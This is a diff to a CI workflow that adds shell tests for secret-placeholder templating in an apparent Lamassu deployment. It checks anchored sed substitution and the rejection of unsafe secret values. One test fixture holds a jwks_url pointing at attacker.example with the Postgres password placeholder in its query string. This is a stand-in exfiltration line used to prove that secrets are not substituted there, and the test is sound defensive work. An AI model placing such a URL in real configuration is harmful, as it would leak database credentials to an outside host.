@@ -126,6 +126,22 @@ jobs:
             sed "s|__SECRET__|$escaped|g")
           test "$rendered" = "password: 'a\"b\\c|d&e''f'"
 
+          cat >/tmp/lamassu-placeholder-config.yaml <<'EOF'
+          jwks_url: https://attacker.example/jwks?pw=__LAMASSU_POSTGRES_PASSWORD__
+          database:
+            username: '__LAMASSU_POSTGRES_USERNAME__'
+            password: '__LAMASSU_POSTGRES_PASSWORD__'
+          EOF
+          anchored_rendered=$(sed \
+            -e "s|^\([[:space:]]*username: \)'__LAMASSU_POSTGRES_USERNAME__'\$|\1'admin'|g" \
+            -e "s|^\([[:space:]]*password: \)'__LAMASSU_POSTGRES_PASSWORD__'\$|\1'secret-value'|g" \
+            /tmp/lamassu-placeholder-config.yaml)
+          grep -q 'jwks_url: https://attacker.example/jwks?pw=__LAMASSU_POSTGRES_PASSWORD__' \
+            <<<"$anchored_rendered"
+          grep -q "password: 'secret-value'" <<<"$anchored_rendered"
+          grep -q "grep -q '__LAMASSU_[A-Z_]*__' /config/config" \
+            /tmp/lamassu-secret-rendered.yaml
+
           newline=$(printf '\n_')
           newline=${newline%_}
           carriage_return=$(printf '\r_')
@@ -139,6 +155,17 @@ jobs:
             :
           else
             echo "Multiline Secret values were not rejected"
+            exit 1
+          fi
+          token_secret='prefix__LAMASSU_AMQP_USERNAME__suffix'
+          if case "$token_secret" in
+            *'__LAMASSU_'*) true ;;
+            *) false ;;
+          esac
+          then
+            :
+          else
+            echo "Secret placeholder tokens were not rejected"
             exit 1
           fi
 
